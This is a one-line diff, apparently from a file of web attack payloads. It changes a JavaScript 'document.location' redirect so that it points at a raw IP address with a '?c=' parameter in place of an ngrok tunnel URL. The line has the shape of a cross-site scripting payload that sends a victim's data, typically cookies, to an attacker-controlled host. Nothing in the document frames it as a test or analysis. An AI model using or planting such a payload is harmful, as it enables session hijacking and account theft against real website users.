@@ -1,1 +1,1 @@
-document.location='https://d714-187-85-166-25.ngrok.io/?c='
+document.location='https://186.235.59.174:80/?c='
